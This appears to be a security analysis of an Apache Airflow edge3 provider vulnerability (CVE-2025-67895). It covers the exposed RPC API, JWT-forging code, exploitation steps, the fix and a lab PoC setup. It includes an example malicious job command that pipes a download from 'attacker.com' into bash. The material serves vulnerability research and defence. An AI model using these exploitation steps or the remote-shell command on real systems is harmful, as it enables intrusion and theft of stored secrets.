# Vulnerability Analysis: CVE-2025-67895

## CVE Summary

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2025-67895 |
| **Affected Software** | apache-airflow-providers-edge3 < 2.0.0 |
| **CVSS** | 9.8 CRITICAL (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **CWE** | CWE-669 (Incorrect Resource Transfer Between Spheres) |
| **Vulnerability Type** | Exposed Internal API / Remote Code Execution |

---

## Root Cause

The Edge3 provider for Apache Airflow, when running on Airflow 2.x (≥2.11.0) with `[edge] api_enabled=True`, registers a **CSRF-exempt Flask Blueprint** via a Connexion OpenAPI specification that exposes Airflow's **entire internal RPC API** through a publicly-reachable HTTP endpoint.

The root cause is a design flaw: the provider was developed for both Airflow 2.x and 3.x compatibility. The Airflow 2.x code path (`_get_airflow_2_api_endpoint()` in `edge_executor_plugin.py`) creates a Connexion-based Flask Blueprint from an OpenAPI spec (`edge_worker_api_v1.yaml`), exempts it from CSRF protection, and routes it to handler functions in `_v2_routes.py`. The most dangerous handler is `rpcapi_v2()`, which:

1. Accepts JSON-RPC 2.0 requests at `/edge_worker/v1/rpcapi`
2. Calls `initialize_method_map()` from `airflow.api_internal.endpoints.rpc_api_endpoint` to obtain ALL internal Airflow RPC methods
3. Deserializes attacker-controlled parameters via `BaseSerialization.deserialize()` (which can reconstruct arbitrary Pydantic/Python objects)
4. Dispatches the deserialized params to ANY internal Airflow method

This effectively proxies the internal Airflow RPC API (intended only for inter-component communication on localhost) to an externally-reachable endpoint.

**Secondary root cause:** On the worker side, `_launch_job_af2_10()` in `worker.py` passes job commands directly to `subprocess.Popen(command)` where `command` is a `list[str]` reconstructed from the database via `ast.literal_eval()` in `parse_command()`.

---

## Vulnerable Files and Functions

### Primary Attack Vector — RPC API Exposure

**File:** `providers/edge3/src/airflow/providers/edge3/worker_api/routes/_v2_routes.py`
**Function:** `rpcapi_v2()` (lines 64-123)
**Entry point:** HTTP POST to `/edge_worker/v1/rpcapi`

```python
def rpcapi_v2(body: dict[str, Any]) -> APIResponse:
    from airflow.api_internal.endpoints.rpc_api_endpoint import initialize_method_map
    # ...
    methods_map = initialize_method_map()  # ALL internal Airflow methods (line 86)
    handler = methods_map[request_obj.method]  # Attacker-controlled method (line 90)
    params = BaseSerialization.deserialize(request_obj.params, use_pydantic_models=True)  # (line 95)
    output = handler(**params, session=session)  # Arbitrary method call (line 103)
```

### Blueprint Registration (CSRF Exempt)

**File:** `providers/edge3/src/airflow/providers/edge3/plugins/edge_executor_plugin.py`
**Function:** `_get_airflow_2_api_endpoint()` (lines 73-94)

```python
bp = FlaskApi(specification=specification, ...).blueprint  # line 83-91
csrf.exempt(bp)  # line 93 — CSRF protection disabled!
```

### Command Execution on Worker Side

**File:** `providers/edge3/src/airflow/providers/edge3/cli/worker.py`
**Function:** `_launch_job_af2_10()` (lines 238-247)

```python
command: list[str] = edge_job.command  # From the database via parse_command()
process = Popen(command, close_fds=True, env=env, start_new_session=True)  # line 245
```

### Command Parsing (ast.literal_eval)

**File:** `providers/edge3/src/airflow/providers/edge3/worker_api/routes/_v2_compat.py`
**Function:** `parse_command()` (lines 141-144)

```python
def parse_command(command: str) -> ExecuteTask:
    from ast import literal_eval
    return literal_eval(command)  # Reconstructs list from DB string
```

### JWT Authentication

**File:** `providers/edge3/src/airflow/providers/edge3/worker_api/auth.py`
**Functions:** `jwt_signer()` (lines 63-71), `jwt_token_authorization()` (lines 87-117), `jwt_token_authorization_rpc()` (lines 120-124)

### OpenAPI Specification

**File:** `providers/edge3/src/airflow/providers/edge3/openapi/edge_worker_api_v1.yaml`
Defines all Airflow 2.x REST/RPC endpoints routed to `_v2_routes.py` handlers.

---

## Triggering Input

### Attack Vector 1: RPC API Method Invocation (Primary)

**HTTP Request:**
```http
POST /edge_worker/v1/rpcapi HTTP/1.1
Host: <airflow-webserver>:8080
Content-Type: application/json
Accept: application/json
Authorization: <JWT-token-with-method-claim>

{
    "jsonrpc": "2.0",
    "method": "<fully.qualified.internal.airflow.method>",
    "params": { <serialized-parameters> }
}
```

The `method` field must be a key in the map returned by `initialize_method_map()`. This includes all methods registered for Airflow's internal RPC API — task instance state management, DAG operations, variable CRUD, connection management, XCom operations, pool management, and more.

**JWT Token Format (Airflow 2.x):**
The token is signed using `airflow.utils.jwt_signer.JWTSigner` with:
- **Secret key:** `conf.get("core", "internal_api_secret_key")`
- **Audience:** `"api"`
- **Claims:** `{"method": "<method_name>"}`
- **Expiration:** `internal_api_clock_grace` seconds (default: 30)

The JWT is generated via `JWTSigner.generate_signed_token({"method": "<method>"})`.

### Attack Vector 2: Worker Registration + Job Injection

1. **Register a fake worker:** POST to `/edge_worker/v1/worker/<attacker_worker>` with a valid JWT
2. **Manipulate job state via RPC API:** Use the `/rpcapi` endpoint to call internal methods that queue jobs with malicious commands
3. **Fetch the malicious job:** POST to `/edge_worker/v1/jobs/fetch/<attacker_worker>` — the worker calls `parse_command()` → `ast.literal_eval()` to reconstruct the command, then `Popen(command)` executes it

### Attack Vector 3: Direct REST Endpoint Abuse

All v2 REST endpoints are exposed and CSRF-exempt:
- `POST /edge_worker/v1/worker/{worker_name}` → `register_v2()`
- `PATCH /edge_worker/v1/worker/{worker_name}` → `set_state_v2()`
- `POST /edge_worker/v1/jobs/fetch/{worker_name}` → `job_fetch_v2()`
- `PATCH /edge_worker/v1/jobs/state/{dag_id}/{task_id}/{run_id}/{try_number}/{map_index}/{state}` → `job_state_v2()`
- `GET /edge_worker/v1/logs/logfile_path/...` → `logfile_path_v2()`
- `POST /edge_worker/v1/logs/push/...` → `push_logs_v2()`

---

## Attack Scenario

### Step-by-step exploitation (RPC API path):

1. **Preconditions:**
   - Target runs Apache Airflow 2.11.x webserver
   - `apache-airflow-providers-edge3` version < 2.0.0 is installed
   - `[edge] api_enabled = True` in airflow.cfg
   - Attacker has network access to the Airflow webserver (port 8080 by default)
   - Attacker knows or can guess `[core] internal_api_secret_key`

2. **Reconnaissance:**
   - Confirm the endpoint exists: `GET /edge_worker/v1/health` returns `{"status": "healthy"}`
   - No authentication needed for the health check

3. **Generate JWT:**
   - Using `airflow.utils.jwt_signer.JWTSigner(secret_key=<known_key>, expiration_time_in_seconds=30, leeway_in_seconds=30, audience="api")`
   - Generate token: `signer.generate_signed_token({"method": "<target_method>"})`
   - Alternatively, craft the JWT manually using PyJWT: `jwt.encode({"method": "<target_method>", "aud": "api", "iat": now, "nbf": now, "exp": now+30}, secret_key, algorithm="HS256")`

4. **Invoke Internal API Methods:**
   - Send JSON-RPC requests to `/edge_worker/v1/rpcapi`
   - Available methods include all from `initialize_method_map()` — potentially hundreds of internal Airflow methods
   - For RCE: Use methods that can write to the `edge_job` database table (e.g., via the executor's `execute_async()` or `queue_workload()` internal paths), inserting a malicious command string
   - Alternatively: Use methods that can manipulate DAGs, variables, connections, or other Airflow internals to achieve desired impact

5. **Achieve RCE (via worker):**
   - If a malicious command is queued in the `edge_job` table, the next Edge Worker that fetches it will execute it via `subprocess.Popen(command)` in `_launch_job_af2_10()`
   - The command is stored as `str(list_of_strings)` in DB and reconstructed via `ast.literal_eval()`
   - Standard Airflow task commands look like: `['airflow', 'tasks', 'run', 'dag_id', 'task_id', 'run_id', '--local', ...]`
   - Malicious commands could be: `['/bin/bash', '-c', 'curl attacker.com/shell | bash']`

### Simplified PoC approach (for lab):

The simplest demonstration is:
1. Set up Airflow 2.11.x + edge3 provider with a known `internal_api_secret_key`
2. Craft a JWT token for the RPC API
3. Send a POST to `/edge_worker/v1/rpcapi` calling an internal method
4. Demonstrate that the internal method executes successfully (proof of API exposure)

For full RCE demonstration, additionally:
5. Use the API to manipulate the database (queue a malicious job)
6. Start an Edge Worker that fetches and executes the malicious command

---

## Impact

- **Confidentiality (HIGH):** Access to all internal Airflow methods exposes DAG definitions, variables (which often contain secrets/API keys), connections (database credentials, cloud provider keys), XCom data, and task logs
- **Integrity (HIGH):** Attacker can modify DAGs, variables, connections, task states, and job queues. Can inject malicious jobs.
- **Availability (HIGH):** Attacker can stop/fail running tasks, corrupt job queues, or cause denial of service
- **Remote Code Execution:** Via job injection and worker-side `subprocess.Popen()` execution, or via `BaseSerialization.deserialize()` object reconstruction

---

## Authentication Requirements

### JWT Authentication (Required)

The endpoints require a valid JWT token in the `Authorization` header. The token is signed with HMAC-SHA256 using the Airflow config key `[core] internal_api_secret_key`.

**Auth flow for the PoC:**

1. **Obtain the secret key:** The `internal_api_secret_key` must be known. In a lab environment, set it explicitly in `airflow.cfg`:
   ```ini
   [core]
   internal_api_secret_key = my-secret-key-for-testing
   ```

2. **Generate a JWT token using PyJWT:**
   ```python
   import jwt
   import time

   secret_key = "my-secret-key-for-testing"
   now = int(time.time())
   
   # For RPC API - method claim must match the JSON-RPC method being called
   payload = {
       "method": "<target_rpc_method>",
       "aud": "api",
       "iat": now,
       "nbf": now,
       "exp": now + 30,
   }
   token = jwt.encode(payload, secret_key, algorithm="HS256")
   ```

3. **For REST endpoints** (non-RPC), the `method` claim must match the URL path after `/edge_worker/v1/`. For example:
   - For `POST /edge_worker/v1/worker/myworker` → method claim = `worker/myworker`
   - For `POST /edge_worker/v1/jobs/fetch/myworker` → method claim = `jobs/fetch/myworker`

4. **Token format in request:**
   ```
   Authorization: Bearer <jwt_token>
   ```
   Or just the raw token string (the code reads `request.headers.get("Authorization", "")` and passes it directly to `jwt_signer.verify_token()`).

**Note on auth bypass:** The CVSS vector states PR:N (no privileges required). While JWT auth exists, the `internal_api_secret_key` is a shared secret that:
- May be default/weak in dev/test setups
- Is the same key used for all internal component communication
- Is not a user credential — it's a deployment configuration value
- If leaked or guessed, grants access to all internal methods

---

## Fix Assessment

### Fix Approach
The fix (commit `fffab39f99607e3c54842342fdc982babd403707`, PR #59143) **completely removes all Airflow 2.x compatibility code** from the Edge3 provider. This is a nuclear approach that eliminates the entire vulnerable surface:

- **Deleted:** `_v2_routes.py` (all Connexion/Flask route handlers including `rpcapi_v2()`)
- **Deleted:** `_v2_compat.py` (Connexion compat shims including `parse_command()` with `ast.literal_eval()`)
- **Deleted:** `edge_worker_api_v1.yaml` (OpenAPI spec defining the Airflow 2.x endpoints)
- **Modified:** `edge_executor_plugin.py` (removed `_get_airflow_2_api_endpoint()`, `csrf.exempt()`, Flask Blueprint registration, all AppBuilder views)
- **Modified:** `auth.py` (removed Airflow 2.x `JWTSigner` auth path)
- **Modified:** `worker.py` (removed `_launch_job_af2_10()` with `subprocess.Popen`)
- **Modified:** `edge_executor.py` (removed `execute_async()` for Airflow 2.x)

### Fix Completeness

The fix is **thorough and complete** for its scope. By removing all Airflow 2.x support, it eliminates:
1. The Connexion Flask Blueprint and all v2 route handlers
2. The CSRF exemption
3. The `/rpcapi` endpoint that proxied the internal API
4. The `BaseSerialization.deserialize()` call on untrusted input
5. The `parse_command()` with `ast.literal_eval()`
6. The `subprocess.Popen(command)` execution path
7. The `JWTSigner` authentication path

The Airflow 3.x code path (FastAPI-based) uses a fundamentally different architecture with `JWTValidator` and does not expose the same internal RPC method map through the Edge Worker API. The Airflow 3.x version uses proper `ExecuteTask` workloads (Pydantic models) instead of raw command strings, and uses `multiprocessing.Process` with a supervisor instead of `subprocess.Popen`.

**No bypass vectors identified.** The fix eliminates the vulnerable code rather than patching it.

---

## Potential Bypass Vectors

None identified. The fix removes the entire Airflow 2.x code path. There is no alternative encoding, different code path, or race condition that could bypass the fix.

---

## Escalation Path

The vulnerability's primary primitive is **arbitrary internal Airflow RPC method invocation**, which is already extremely powerful:

1. **RPC API → Variable/Connection Read:** Call internal methods to read Airflow Variables and Connections, which commonly store database credentials, API keys, cloud provider secrets, and other sensitive configuration.

2. **RPC API → Job Injection → RCE:** Use internal methods to insert rows into the `edge_job` table with malicious command strings. When an Edge Worker fetches the job, it executes the command via `subprocess.Popen()`.

3. **RPC API → DAG Manipulation:** Modify DAG configurations, trigger DAG runs, or manipulate task states to cause execution of attacker-controlled code.

4. **BaseSerialization.deserialize() → Object Instantiation:** The `BaseSerialization.deserialize(params, use_pydantic_models=True)` call reconstructs Python objects from serialized data. Depending on the Airflow version and serialization implementation, this may allow instantiation of arbitrary objects (potential for code execution via deserialization gadgets).

**Most viable escalation path for PoC:** RPC API → read Variables/Connections (information disclosure) + queue malicious EdgeJob → Edge Worker executes via Popen (RCE).

---

## Related Attack Surface

### 1. `ast.literal_eval()` in EdgeWorkerModel.queues property

**File:** `providers/edge3/src/airflow/providers/edge3/models/edge_worker.py` (line 129)

```python
@property
def queues(self) -> list[str] | None:
    if self._queues:
        return ast.literal_eval(self._queues)
    return None
```

This uses `ast.literal_eval()` to deserialize the queue list from the database. While `literal_eval` is safe against code execution (only evaluates literal Python values), if an attacker can control the `_queues` field value in the database (e.g., via the RPC API), they could cause parsing errors or inject unexpected data structures. This is a low-severity issue since `literal_eval` does not execute arbitrary code.

### 2. All v2 REST endpoints (same vulnerability)

The following endpoints in `_v2_routes.py` are all part of the same vulnerable CSRF-exempt Flask Blueprint:
- `register_v2()` — allows registering fake workers
- `set_state_v2()` — allows modifying worker state
- `job_fetch_v2()` — allows fetching queued jobs (information disclosure)
- `job_state_v2()` — allows modifying job state
- `logfile_path_v2()` — path traversal/information disclosure potential
- `push_logs_v2()` — allows writing arbitrary log data

All are removed by the fix.

### 3. No other providers with similar pattern

The `FlaskApi` + `csrf.exempt()` + `_v2_routes.py` pattern is unique to the Edge3 provider within the `providers/` directory. No other provider in the repository uses this pattern.

---

## Build System

| Field | Value |
|-------|-------|
| **Build System** | flit_core 3.12.0 |
| **Language** | Python 3.10+ |
| **Package Manager** | pip |

### Build Commands

The Edge3 provider is a pure Python package — no compilation needed:

```bash
# Install the vulnerable version directly from PyPI
pip install apache-airflow-providers-edge3==1.6.0

# Or install from source
cd providers/edge3
pip install -e .
```

However, the full lab requires an Apache Airflow 2.11.x deployment:

```bash
# Install Airflow 2.11.0 (the minimum version for edge3 provider)
pip install apache-airflow==2.11.0

# Install the vulnerable edge3 provider
pip install apache-airflow-providers-edge3==1.6.0

# Required transitive dependencies (automatically installed):
# - connexion (for OpenAPI/Flask routing)
# - flask, flask-appbuilder (Airflow 2.x webserver)
# - pydantic>=2.11.0
# - retryhttp>=1.2.0
# - itsdangerous (JWT signing)
```

### Dependencies

**Python packages (installed via pip):**
- `apache-airflow>=2.11.0,<3.0.0` — Core Airflow (MUST be version 2.x to trigger the vulnerability)
- `apache-airflow-providers-edge3==1.6.0` — Vulnerable provider
- `apache-airflow-providers-common-compat>=1.10.0` — Compatibility layer (auto-installed)
- `pydantic>=2.11.0` — Data validation
- `retryhttp>=1.2.0,!=1.3.0` — HTTP retry
- `connexion` — OpenAPI/Swagger framework (Airflow 2.x dependency)
- `flask` — Web framework
- `itsdangerous` — JWT/token signing
- `PyJWT` — JWT encoding/decoding (for the PoC client)

**System packages:**
- Python 3.10+
- PostgreSQL client libraries (if using PostgreSQL backend)

### Runtime Requirements

1. **Apache Airflow 2.11.x webserver** — Must be running and accessible on a network port (default: 8080)
2. **Database backend** — PostgreSQL recommended (SQLite works for testing)
3. **Configuration (`airflow.cfg`):**
   ```ini
   [edge]
   api_enabled = True
   
   [core]
   executor = airflow.providers.edge3.executors.EdgeExecutor
   internal_api_secret_key = <known-secret-key>
   ```
4. **For full RCE demo:** An Edge Worker process running (`airflow edge worker`)

### Docker Lab Recommendations

- **Base image:** `python:3.10-slim` or `apache/airflow:2.11.0-python3.10`
- **Services:** Airflow webserver + PostgreSQL + (optional) Edge Worker
- **Docker Compose:** Recommended for multi-service setup
- **Network:** All services on the same Docker network; webserver port exposed to host
- **The webserver must start with gunicorn** (this is how `RUNNING_ON_APISERVER` is detected for Airflow 2.x):
  ```python
  RUNNING_ON_APISERVER = "gunicorn" in sys.argv[0] and "airflow-webserver" in sys.argv
  ```
  This means `airflow webserver` (which uses gunicorn internally) will activate the plugin.

### PoC Script Requirements

The PoC script needs:
- `requests` — HTTP client
- `PyJWT` — JWT token generation
- Standard library only for the JWT generation (alternatively can use `itsdangerous`)

Minimal PoC approach:
1. Check health endpoint (no auth): `GET /edge_worker/v1/health`
2. Generate JWT with known secret key
3. Call the RPC API with a benign internal method to prove access
4. (Optional) Call a method that reads sensitive data (Variables, Connections)
5. (Optional) Inject a malicious job and demonstrate worker execution
